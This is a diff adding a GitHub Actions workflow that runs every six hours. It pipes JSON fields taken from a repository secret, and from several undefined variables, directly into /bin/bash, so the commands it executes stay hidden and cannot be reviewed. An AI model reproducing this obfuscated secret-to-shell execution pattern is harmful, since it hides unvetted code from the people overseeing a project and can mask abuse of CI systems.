@@ -1,0 +1,22 @@
+name: xiaocaixixue
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaocaixixue
+        env:
+          ys4056: ${{ secrets.ys4056 }}
+        run: |
+          echo $ys4056 | jq -r .t08 | /bin/bash
+          echo $w720 | jq -r .s8 | /bin/bash
+          echo $oypi94499 | jq -r .k0940 | /bin/bash
+          echo $wdask9 | jq -r .kikht0412 | /bin/bash
+          echo $n953 | jq -r .zdrll12 | /bin/bash
+          echo $aaidy22 | jq -r .yqzx57 | /bin/bash
+
